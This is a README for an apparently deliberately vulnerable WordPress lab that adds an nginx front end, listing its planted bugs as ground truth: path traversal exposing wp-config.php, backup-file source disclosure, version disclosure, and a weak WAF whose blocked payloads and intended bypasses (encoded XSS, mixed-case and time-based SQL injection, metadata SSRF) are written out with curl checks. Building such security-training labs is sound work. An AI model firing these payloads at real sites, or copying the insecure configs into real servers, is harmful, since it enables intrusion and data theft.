# Phase D — Alternative nginx + PHP 8.1 + ModSecurity-lite stack

Author: Ayi NEDJIMI <ayinedjimi@users.noreply.github.com>

This phase swaps the default Apache+mod_php WordPress front-end for an
nginx 1.18 + php:8.1-fpm-alpine stack, fronted by a deliberately loose
"ModSecurity-style" ruleset. It reuses the same `db` and `wp_data` volume
from the base compose so the *same* WordPress install is served, just
behind a different web server with different bugs.

> DO NOT EXPOSE TO THE INTERNET. Lab use only.

## Bring it up

```bash
docker compose -f docker-compose.yml -f docker-compose.nginx.yml up -d
```

Then browse:

- Apache front (existing): http://localhost:31338
- nginx front (new):       http://localhost:31888

Both serve the same `wp_data` volume.

Tear down (keeps DB):

```bash
docker compose -f docker-compose.yml -f docker-compose.nginx.yml down
```

## Port allocation

| Service | Container       | Host port | Container port |
|---------|-----------------|-----------|----------------|
| nginx   | wpvl-nginx      | 31888     | 80             |
| php-fpm | wpvl-wp-php     | (internal only) | 9000     |

No collisions with the base compose (31306/31338/31339/31340/31325/31341/31379/31211) or with Phase C (31254/31300/31322/31392/31900/31901).

## Intentional bugs (ground truth)

### Bug #1 — `alias` directory traversal
`location /` is configured with `alias /var/www/html/$uri` instead of the
correct `root` directive. Because `alias` strips the matched location
prefix, requests like `GET /static../wp-config.php` resolve outside the
intended path.

Verify:
```bash
curl -i "http://localhost:31888/..%2fwp-config.php"
curl -i "http://localhost:31888/x/../wp-config.php"
```
Expected: contents of `wp-config.php` (or a 200 with PHP source if the
location does not match the PHP block).

### Bug #2 — PHP source disclosure via backup files
The `if (-f $request_filename)` block sits *before* the `location ~ \.php$`
block. Any backup file `wp-config.php~`, `wp-config.php.bak`,
`index.php.swp` is served as `text/plain` instead of being executed or
denied.

Verify (after creating a backup file in `wp_data`):
```bash
docker exec wpvl-wordpress sh -c 'cp /var/www/html/wp-config.php /var/www/html/wp-config.php~'
curl -i "http://localhost:31888/wp-config.php~"
```
Expected: PHP source returned with `Content-Type: text/plain`.

### Bug #3 — `server_tokens on`
Full nginx version disclosed in `Server:` header and default error pages.

Verify:
```bash
curl -sI http://localhost:31888/ | grep -i server
curl -s  http://localhost:31888/nonexistent | grep -i nginx
```
Expected: `Server: nginx/1.18.0`.

## ModSecurity-lite WAF — what it catches and misses

See `config/nginx/modsec.conf`. Implemented via plain nginx `if` checks
against `$args` and `$request_uri` (stock nginx:1.18 has no real
libmodsecurity).

**Blocked (403):**
- `?q=<script>alert(1)</script>`
- `?id=1 UNION SELECT 1,2,3`
- `/../../etc/passwd` (literal)
- `?cmd=/bin/bash`
- `?x=<iframe src=...>`

**Bypasses on purpose:**
- URL-encoded XSS: `?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E`
- Double-encoded: `?q=%253Cscript%253E`
- Case-mixed SQLi: `?id=1 UnIoN SeLeCt 1,2,3`
- Blind SQLi: `?id=1 AND SLEEP(5)`, `BENCHMARK(...)`
- SSRF: any `?url=http://aws-metadata/...` is allowed through
- XXE / SSTI / JSON-body payloads (only `$args` is inspected)
- Multipart / POST body attacks

Verify a block:
```bash
curl -i "http://localhost:31888/?q=<script>alert(1)</script>"
# -> 403 Forbidden
```

Verify a bypass:
```bash
curl -i "http://localhost:31888/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
# -> 200 (request reaches WordPress)
```

## Switching between Apache and nginx

- Apache only: `docker compose up -d`
- Apache + auxiliary services: `docker compose -f docker-compose.yml -f docker-compose.aux.yml up -d`
- nginx alongside Apache: `docker compose -f docker-compose.yml -f docker-compose.nginx.yml up -d`
- Full stack:
  ```bash
  docker compose \
    -f docker-compose.yml \
    -f docker-compose.aux.yml \
    -f docker-compose.nginx.yml up -d
  ```
